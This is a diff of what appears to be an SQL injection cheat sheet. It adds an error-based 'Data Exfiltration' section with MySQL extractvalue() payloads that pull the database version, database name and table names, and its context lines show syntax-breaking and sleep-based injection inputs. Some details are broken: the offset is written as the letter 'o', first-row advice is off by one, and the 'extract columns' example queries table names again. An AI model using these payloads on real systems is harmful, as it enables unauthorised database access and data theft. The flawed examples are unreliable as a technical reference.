@@ -87,7 +87,7 @@ $stmt->bindParam(':lastname', $lastname); <br>
 $stmt->bindParam(':email', $email); <br>
 <br>
 
-Case 2: Black box error based SQL Injection <br>
+Case 2: Black box Error based SQL Injection <br>
 1. single quote('), double quote("), and(&), semicolon(;), double dash(--) any character that break the SQL syntax. SQL server return Syntex error to end user. <br>
 Ex : $sql="SELECT * FROM users WHERE username = ''' AND password = '$password'";  /* gives syntax error */ <br>
   
@@ -117,5 +117,16 @@ Ex 2. SELECT IF(1=1,sleep(10),'a'); <br>
 9. ' & 2=2 # <br>
 
 # Data Exfiltration
-Coming------
+Case 1: Error based (Error based SQL Injection is used when UNION based SQL Injection is not possible) <br>
+Ex 1: Extract DB version <br>
+test' AND extractvalue(rand(),concat(0x3a,(SELECT @@version))) #<br>
+
+Ex 2: Extract DB<br>
+test' AND extractvalue(rand(),concat(0x3a,(SELECT database()))) #<br>
+
+Ex 3: Extract All tables<br>
+test' AND extractvalue(rand(),concat(0x3a,(SELECT table_name from information_schema.tables limit o,1))) #  /*where o=offset, 1= one result, extract result one by one by increamenting offset value. For extracting first row put o=1 */<br>
+
+Ex 4: Extract columns from a table<br>
+test' AND extractvalue(rand(),concat(0x3a,(SELECT table_name from information_schema.tables where table_name='xyz' limit o,1))) #  /*where o=offset, 1= one result, extract result one by one by increamenting offset value. For extracting first row put o=1 */<br>
     
